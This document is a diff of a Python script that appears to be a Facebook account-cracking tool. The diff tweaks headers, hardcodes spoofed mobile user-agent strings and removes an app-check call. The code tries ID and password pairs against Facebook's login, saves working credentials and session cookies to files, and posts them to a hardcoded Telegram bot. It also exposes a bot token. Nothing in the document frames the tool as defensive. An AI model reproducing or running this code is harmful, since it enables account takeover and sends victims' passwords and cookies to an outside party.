@@ -374,7 +374,7 @@ mtd,cp_xdx,cokix=[],[],[]
 token = ('6628496363:AAFRd1HpukVfL1uuaXfUPABhyaAfLYkzRTU')
 ID = ('1778046662')
 def cek_apk(session,coki):
-    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -1437,7 +1437,7 @@ def m7(idf,pwv):
             'X-FB-Connection-Type':'unknown',
             'X-FB-connection-quality':'EXCELLENT',
             "X-Tigon-Is-Retry": "False",
-            'User-Agent':useragent,
+            'User-Agent':'[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=3.0,width=1080,height=2068};FBLC/en_US;FBRV/235412020;FBCR/GLOBE;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1819;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]',
             "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
             'Accept-Encoding':'gzip, deflate',
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -1454,7 +1454,6 @@ def m7(idf,pwv):
                     if 'Photoshop' in res:
                             print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
                             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie}\33[1;36m")
-                            cek_apk(session,coki)
                             statusok = (f" {user} | {ps} | {coki} ")
                             open('/sdcard/ATOM-M7-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
@@ -1523,7 +1522,7 @@ def m8(idf,pwv):
             'X-FB-Connection-Type':'unknown',
             'X-FB-connection-quality':'EXCELLENT',
             "X-Tigon-Is-Retry": "False",
-            'User-Agent':useragent,
+            'User-Agent':'[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/230826563;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]',
             "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
             'Accept-Encoding':'gzip, deflate',
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -1540,7 +1539,6 @@ def m8(idf,pwv):
                     if 'Photoshop' in res:
                             print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
                             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie}\33[1;36m")
-                            cek_apk(session,coki)
                             open('/sdcard/ATOM-M8-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                             statusok = (f" {user} | {ps} | {coki} ")
                             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
